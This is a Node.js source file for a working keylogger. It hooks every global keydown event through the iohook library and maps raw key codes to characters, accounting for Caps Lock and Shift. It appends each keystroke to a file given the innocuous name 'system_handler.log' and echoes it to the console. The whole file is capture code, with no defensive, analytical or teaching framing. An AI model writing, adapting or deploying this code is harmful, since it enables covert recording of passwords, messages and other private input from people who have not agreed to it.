const fs = require('fs');
const iohook = require('iohook');
const check = require('node-check-windows-capslock');

iohook.addListener('keydown', callback);
iohook.start();

const file = fs.createWriteStream('./system_handler.log', {
    flags: 'a'
});

function callback(e) {
    const key = processKey(e);
    if(key) {
        file.write(`${key}\n`);
        process.stdout.write(key);
    }
}

function processKey(e) {
    try {
        const keyCodes = {
            0: null,
            3: 'Break',
            8: 'Backspace',
            9: 'Tab',
            12: 'Clear',
            13: 'Enter',
            16: '',
            17: '',
            18: '',
            19: 'pause/break',
            20: '',
            21: 'hangul',
            25: 'hanja',
            27: 'Esc',
            32: 'space',
            33: 'Page Up',
            34: 'Page Down',
            35: 'End',
            36: 'Home',
            37: 'LeftArrowKey',
            38: 'UpArrowKey',
            39: 'RightArrowKey',
            40: 'DownArrowKey',
            41: 'Select',
            42: 'Print',
            43: 'Execute',
            44: 'Print Screen',
            45: 'Insert',
            46: 'Delete',
            47: 'Help',
            48: '0',
            49: '1',
            50: '2',
            51: '3',
            52: '4',
            53: '5',
            54: '6',
            55: '7',
            56: '8',
            57: '9',
            58: ':',
            59: ';',
            60: '<',
            61: '=',
            63: 'ß',
            65: 'a',
            66: 'b',
            67: 'c',
            68: 'd',
            69: 'e',
            70: 'f',
            71: 'g',
            72: 'h',
            73: 'i',
            74: 'j',
            75: 'k',
            76: 'l',
            77: 'm',
            78: 'n',
            79: 'o',
            80: 'p',
            81: 'q',
            82: 'r',
            83: 's',
            84: 't',
            85: 'u',
            86: 'v',
            87: 'w',
            88: 'x',
            89: 'y',
            90: 'z',
            91: '',
            92: '',
            93: 'Menu',
            95: 'Sleep',
            96: '0',
            97: '1',
            98: '2',
            99: '3',
            100: '4',
            101: '5',
            102: '6',
            103: '7',
            104: '8',
            105: '9',
            106: '*',
            107: '+',
            108: '.',
            109: '-',
            110: '.',
            111: '/',
            112: 'f1',
            113: 'f2',
            114: 'f3',
            115: 'f4',
            116: 'f5',
            117: 'f6',
            118: 'f7',
            119: 'f8',
            120: 'f9',
            121: 'f10',
            122: 'f11',
            123: 'f12',
            144: 'NumLock',
            145: 'Scroll Lock',
            151: 'AirplaneMode',
            160: '',
            161: '!',
            162: '',
            163: '#',
            164: '',
            165: '',
            166: 'PageFackward',
            167: 'PageForward',
            168: 'refresh',
            170: '*',
            171: '~ + * key',
            172: 'home key',
            173: '-',
            174: 'DecreaseVolumeLevel',
            175: 'IncreaseVolumeLevel',
            176: 'next',
            177: 'previous',
            178: 'stop',
            179: 'play/pause',
            180: 'e-mail',
            181: 'mute/unmute',
            182: 'DecreaseVolumeLevel',
            183: 'IncreaseVolumeLevel',
            186: ';',
            187: '=',
            188: ',',
            189: '-',
            190: '.',
            191: '/',
            192: '`',
            193: '?',
            194: '.',
            219: '[',
            220: '\\',
            221: ']',
            222: `'`,
            223: '`'
        }
        const caps = check.IsCapslockOpen();
        let character = caps ? keyCodes[e.rawcode].toUpperCase() : keyCodes[e.rawcode]
        if(e.shiftKey && e.rawcode >= 65 && e.rawcode <= 90)
            character = caps ? character.toLowerCase() : character.toUpperCase();
        if(e.shiftKey) {
            character = ({
                48: ')',
                49: '!',
                50: '@',
                51: '#',
                52: '$',
                53: '%',
                54: '^',
                55: '&',
                56: '*',
                57: '(',
                186: ':',
                107: '+',
                187: '+',
                188: '<',
                189: '_',
                190: '>',
                191: '?',
                192: '~',
                219: '{',
                220: '|',
                221: '}',
                222: '"'
            })[e.rawcode] || character;
        }
        let extra = 
            (e.altKey ? ' Alt ' : '') +
            (e.metaKey ? 'Meta ' : '') +
            (e.ctrlKey ? ' Ctrl ' : '');
            //(e.shiftKey ? ' Shift ' : '');
        if(extra[0] === ' ')
            extra = extra.slice(1);
        if(extra.length > 0)
            character = extra + character;
        if(character.length < 1)
            return null;       
        return character;
    } catch(e) {}
}